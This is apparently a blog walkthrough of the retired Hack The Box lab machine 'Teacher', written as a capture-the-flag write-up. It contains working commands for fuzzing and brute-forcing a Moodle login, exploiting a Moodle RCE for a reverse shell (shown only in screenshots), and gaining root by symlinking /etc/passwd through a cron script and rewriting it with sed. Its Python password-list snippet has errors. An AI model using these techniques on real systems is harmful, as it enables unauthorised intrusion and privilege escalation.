---
layout: post
title: "Teacher: Hack The Box Walkthrough"
date: 2019-04-21 02:33:27 +0000
last_modified_at: 2019-04-21 02:33:57 +0000
category: Walkthrough
tags: ["Hack The Box", Teacher, retired]
comments: true
image:
  feature: teacher-htb-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/baby-sitter-children-educator-nanny-1073411/
---

This post documents the complete walkthrough of Teacher, a retired vulnerable [VM][1] created by [Gioo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Teacher is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.153
...
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
```

`nmap` finds `80/tcp` open. Let's go with that.

### Directory/File Enumeration

Based on my experience, it's always good to run some kind of fuzzing when faced with a lack of hints. Let's run `wfuzz` and SecList's `common.txt`, and see what we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://10.10.10.153/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/FUZZ
Total requests: 4593

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000010:  C=403     11 L	      32 W	    291 Ch	  ".hta"
000011:  C=403     11 L	      32 W	    296 Ch	  ".htaccess"
000012:  C=403     11 L	      32 W	    296 Ch	  ".htpasswd"
001232:  C=301      9 L	      28 W	    310 Ch	  "css"
001735:  C=301      9 L	      28 W	    312 Ch	  "fonts"
002067:  C=301      9 L	      28 W	    313 Ch	  "images"
002094:  C=200    249 L	     747 W	   8028 Ch	  "index.html"
002218:  C=301      9 L	      28 W	    317 Ch	  "javascript"
002250:  C=301      9 L	      28 W	    309 Ch	  "js"
002497:  C=301      9 L	      28 W	    313 Ch	  "manual"
002627:  C=301      9 L	      28 W	    313 Ch	  "moodle"
002995:  C=403     11 L	      32 W	    297 Ch	  "phpmyadmin"
003597:  C=403     11 L	      32 W	    300 Ch	  "server-status"

Total time: 47.61103
Processed Requests: 4593
Filtered Requests: 4580
Requests/sec.: 96.46924
```

The site is running Moodle. [Moodle](https://github.com/moodle/moodle) is the world's open source learning platform. Moodle has its fair share of SQLi and RCE vulnerabilities but would require authenticated access.


{% include image.html image_alt="d31325ca.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/d31325ca.png" %}


While I was hunting around for a credential, something caught my eye at the Teacher's gallery page.


{% include image.html image_alt="7f34d280.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/7f34d280.png" %}


I got double F's! Something funky is going on here...


{% include image.html image_alt="0cf66884.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/0cf66884.png" %}


`5.png` is not an image. It's a text file.


{% include image.html image_alt="51d6ef0b.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/51d6ef0b.png" %}


Gotcha!

It's easy to generate a password list for brute-forcing the Moodle login form. You can do it with Python like so.

```python
import string

charset = string.ascii_letters + string.digits + string.punctuations

f = open('passwords.txt', 'w')
s = Th4C00lTheacha
t = ''

for c in charset:
  t += s + c + '\n'

f.write(t)
f.close()
```

Once the password list is generated, we can use `wfuzz` to brute-force it.

```
# wfuzz -w passwords.txt --hh 440 -t 20 -d "anchor=&username=giovanni&password=FUZZ" http://10.10.10.153/moodle/login/index.php
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/moodle/login/index.php
Total requests: 94

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000065:  C=303      6 L	      34 W	    454 Ch	  "Th4C00lTheacha#"

Total time: 17.72110
Processed Requests: 94
Filtered Requests: 93
Requests/sec.: 5.304409
```

The credential is (`giovanni:Th4C00lTheacha#`).


{% include image.html image_alt="ca2fc9fc.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/ca2fc9fc.png" %}


## Low-Privilege Shell

Following the instructions from this [post](https://blog.ripstech.com/2018/moodle-remote-code-execution/), I was able to execute a reverse shell back to me.

First, create a calculated question like so.


{% include image.html image_alt="4cd4b5a0.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/4cd4b5a0.png" %}


Create the formula like so.


{% include image.html image_alt="ef16f0d5.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/ef16f0d5.png" %}


Then execute remote commands on the host to run a reverse shell back to me using `nc`.


{% include image.html image_alt="213a07a8.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/213a07a8.png" %}


There you have it, a low-privilege shell.


{% include image.html image_alt="400efef7.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/400efef7.png" %}


Let's upgrade our shell with a pseudo-TTY using Python and then `stty raw -echo; fg; reset`.

## Privilege Escalation

I'm aware that Moodle connects to a database backend to store all the good stuff. The database settings are in `config.php` at the Moodle directory.


{% include image.html image_alt="30e91902.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/30e91902.png" %}


Let's connect to the database.


{% include image.html image_alt="b4d16fec.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/b4d16fec.png" %}


Cracking the MD5 hash is easy.


{% include image.html image_alt="1dc2b446.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/1dc2b446.png" %}


This is the password to `giovanni`'s account. `user.txt` is in the home directory.


{% include image.html image_alt="2a856c44.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/2a856c44.png" %}


During enumeration of `giovanni`'s account, I noticed the pressence of `work` directory and `/usr/bin/backup.sh` referred to it.


{% include image.html image_alt="dc87e44b.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/dc87e44b.png" %}


If I had to guess, I would say this is inside a `cron` job ran with `root` privileges since `giovanni` has no permissions to edit it.

But, look at the last line. It changes the permissions of any file to `rwxrwxrwx`. What if I put a symbolic link to `/etc/passwd` in it?


{% include image.html image_alt="39075b90.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/39075b90.png" %}


Boom! Anyone can edit `/etc/passwd`. Let's give ourselves `root` access.

```
$ sed -r '1h;x;2s/root:x/toor:to5bce5sr7eK6/' /etc/passwd > /tmp/passwd
$ cp /tmp/passwd /etc/passwd
```


{% include image.html image_alt="7a326bec.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/7a326bec.png" %}


With a `root` shell, getting `root.txt` is a breeze.


{% include image.html image_alt="f6295439.png" image_src="/8b223cc1-4095-45cd-ab6d-0e3265cc766a/f6295439.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/165
[2]: https://www.hackthebox.eu/home/users/profile/623
[3]: https://www.hackthebox.eu/
